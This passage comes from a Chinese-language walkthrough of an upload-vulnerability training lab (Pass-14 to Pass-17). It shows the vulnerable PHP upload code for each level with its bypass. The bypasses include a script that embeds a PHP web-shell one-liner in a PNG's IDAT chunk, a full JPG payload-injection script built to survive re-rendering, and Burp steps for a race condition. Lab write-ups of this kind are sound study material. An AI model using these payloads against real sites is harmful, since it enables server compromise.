<span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="绕过方式-v13">绕过方式</h4>
<p>PHP函数<code>getimagesize()</code>可以获取图片的宽、高等信息，如果上传的不是图片文件，那么<code>getimagesize()</code>就获取不到信息，则不允许上传。而<code>image_type_to_extension()</code>函数则根据图像类型返回对应的后缀名。</p>
<p>和Pass-13相似，使用文件合成命令生成图片马。</p>
<h3 id="Pass-15-利用图片马绕过exif-imagetype">Pass-15 利用图片马绕过exif_imagetype()</h3>
<h4 id="代码-v14">代码</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params">$filename</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br><span class="line">    <span class="keyword">switch</span> ($image_type) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="绕过方式-v14">绕过方式</h4>
<p>exif_imagetype()：读取一个图像的第一个字节并检查其签名。</p>
<p>同Pass-13生成图片马上传绕过。</p>
<blockquote>
<p>get_imagesize()和exif_imagetype()对上传的图片检查有何不同：</p>
<p>通过调用exif_imagetype()函数判断图像类型的方法更具有容错性、能够对无法正常显示的图片马进行正常处理；而通过调用getimagesize()函数和image_type_to_extension()函数来获取图像类型并设置后缀名的方法是没办法对无法正常显示的图片马进行正常处理的。</p>
</blockquote>
<h3 id="Pass-16-二次渲染绕过">Pass-16 二次渲染绕过</h3>
<h4 id="代码-v15">代码</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    $filename = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    $filetype = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    $tmpname = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    $target_path=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.basename($filename);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    $fileext= substr(strrchr($filename,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>(($fileext == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; ($filetype==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="literal">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$newfilename;</span><br><span class="line">                imagejpeg($im,$img_path);</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">&quot;png&quot;</span>) &amp;&amp; ($filetype==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefrompng($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="literal">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">&quot;该文件不是png格式的图片！&quot;</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$newfilename;</span><br><span class="line">                imagepng($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="literal">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">&quot;gif&quot;</span>) &amp;&amp; ($filetype==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefromgif($target_path);</span><br><span class="line">            <span class="keyword">if</span>($im == <span class="literal">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">&quot;该文件不是gif格式的图片！&quot;</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$newfilename;</span><br><span class="line">                imagegif($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="绕过方式-v15">绕过方式</h4>
<p>绕过思路：对比上传前和上传后的图片的差异，找到相同数据同时又是非图片数据区的地方，在在，此处写入恶意代码。 不同图像类型的插入方式有区别。</p>
<h5 id="GIF">GIF</h5>
<p>GIF二次渲染绕过说是最简单的，将源文件和二次渲染过的文件进行比较，找出源文件中没有被修改的那段区域，在那段区域写入php代码即可。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191202140626.png" alt=""></p>
<p>保存之后，上传该修改后的图片，能够成功利用：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191202140824.png" alt=""></p>
<h5 id="PNG">PNG</h5>
<p>png和jpg当然没有gif这么简单。这里我也不细分析了(分析不来~~)<br>
直接记个方法,将php代码写入IDAT数据块。<br>
用国外大牛的脚本，目的是向PNG图片的IDAT数据块中插入PHP后门代码<code>&lt;?=$_GET[0]($_POST[1]);?&gt;</code> ：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$p = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$img = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($y = <span class="number">0</span>; $y &lt; sizeof($p); $y += <span class="number">3</span>) &#123;</span><br><span class="line">   $r = $p[$y];</span><br><span class="line">   $g = $p[$y+<span class="number">1</span>];</span><br><span class="line">   $b = $p[$y+<span class="number">2</span>];</span><br><span class="line">   $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">   imagesetpixel($img, round($y / <span class="number">3</span>), <span class="number">0</span>, $color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>直接运行该脚本生成1.png上传即可。</p>
<h5 id="JPG">JPG</h5>
<p>JPG图片也使用脚本来生成，根据具体情况来更改<code>miniPayload</code>的值：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">    2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">    1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span></span><br><span class="line"><span class="comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    See also:</span></span><br><span class="line"><span class="comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    $miniPayload = <span class="string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;gd&#x27;</span>) || !function_exists(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($argv[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>($pad = <span class="number">0</span>; $pad &lt; <span class="number">1024</span>; $pad++) &#123;</span><br><span class="line">        $nullbytePayloadSize = $pad;</span><br><span class="line">        $dis = <span class="keyword">new</span> DataInputStream($argv[<span class="number">1</span>]);</span><br><span class="line">        $outStream = file_get_contents($argv[<span class="number">1</span>]);</span><br><span class="line">        $extraBytes = <span class="number">0</span>;</span><br><span class="line">        $correctImage = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($dis-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            $marker = $dis-&gt;readByte();</span><br><span class="line">            $size = $dis-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">            $dis-&gt;skip($size);</span><br><span class="line">            <span class="keyword">if</span>($marker === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                $startPos = $dis-&gt;seek();</span><br><span class="line">                $outStreamTmp = </span><br><span class="line">                    substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">                    $miniPayload . </span><br><span class="line">                    str_repeat(<span class="string">&quot;\0&quot;</span>,$nullbytePayloadSize) . </span><br><span class="line">                    substr($outStream, $startPos);</span><br><span class="line">                checkImage(<span class="string">&#x27;_&#x27;</span>.$argv[<span class="number">1</span>], $outStreamTmp, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>($extraBytes !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!$dis-&gt;eof())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>($dis-&gt;readByte() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>($dis-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $stopPos = $dis-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">                    $imageStreamSize = $stopPos - $startPos;</span><br><span class="line">                    $outStream = </span><br><span class="line">                        substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">                        $miniPayload . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(<span class="string">&quot;\0&quot;</span>,$nullbytePayloadSize).</span><br><span class="line">                                substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class="line">                                substr($outStream, $stopPos);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>($correctImage) &#123;</span><br><span class="line">                    $outStream = $outStreamTmp;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(checkImage(<span class="string">&#x27;payload_&#x27;</span>.$argv[<span class="number">1</span>], $outStream)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(<span class="string">&#x27;payload_&#x27;</span>.$argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params">$filename, $data, $unlink = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $correctImage;</span><br><span class="line">        file_put_contents($filename, $data);</span><br><span class="line">        $correctImage = <span class="literal">TRUE</span>;</span><br><span class="line">        imagecreatefromjpeg($filename);</span><br><span class="line">        <span class="keyword">if</span>($unlink)</span><br><span class="line">            unlink($filename);</span><br><span class="line">        <span class="keyword">return</span> $correctImage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params">$errno, $errstr, $errfile, $errline</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $extraBytes, $correctImage;</span><br><span class="line">        $correctImage = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, $errstr, $m)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($m[<span class="number">1</span>])) &#123;</span><br><span class="line">                $extraBytes = (<span class="keyword">int</span>)$m[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $binData;</span><br><span class="line">        <span class="keyword">private</span> $order;</span><br><span class="line">        <span class="keyword">private</span> $size;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$filename, $order = <span class="literal">false</span>, $fromString = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;order = $order;</span><br><span class="line">            <span class="keyword">if</span>(!$fromString) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!file_exists($filename) || !is_file($filename))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.$filename.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = file_get_contents($filename);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = $filename;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params">$skip</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, $skip);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $byte = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> ord($byte);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $short = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;</span><br><span class="line">                $short = (ord($short[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $short = (ord($short[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $short;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>使用方法：</p>
<ol>
<li>先将一张正常的jpg图片上传，上传后将服务器存储的二次渲染的图片保存下来。</li>
<li>将保存下来经过服务器二次渲染的那张jpg图片，用此脚本进行处理生成payload.jpg</li>
<li>然后再上传payload.jpg</li>
</ol>
<h3 id="Pass-17-利用竞争条件绕过">Pass-17 利用竞争条件绕过</h3>
<h4 id="代码-v16">代码</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    $file_name = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    $upload_file = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="绕过方式-v16">绕过方式</h4>
<p>查看源码，发现是个条件竞争，上传成功的文件会被重命名，而上传失败的文件会先保存在upload目录中、然后再调用unlink()删除该不合法的上传文件：</p>
<p>代码存在条件竞争问题，非法文件上传后会先保存在upload目录中，然后再调用unlink()函数来删除，在这中间的时间差中，我们可以不断上传和访问非法的PHP文件，速度够快时就能触发成功。</p>
<p>用burp开启两个intruder模块，一个用于重复上传，另一个用于重复访问。</p>
<p>Step1： 先设置上传请求，Burp拦截到上传文件的数据包后发送到Intruder模块，因为此处没有什么参数需要爆破，只是需要重复发起请求，所以payload设置为Null payloads,设置访问次数5000次，线程50个。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191202152822.png" alt=""></p>
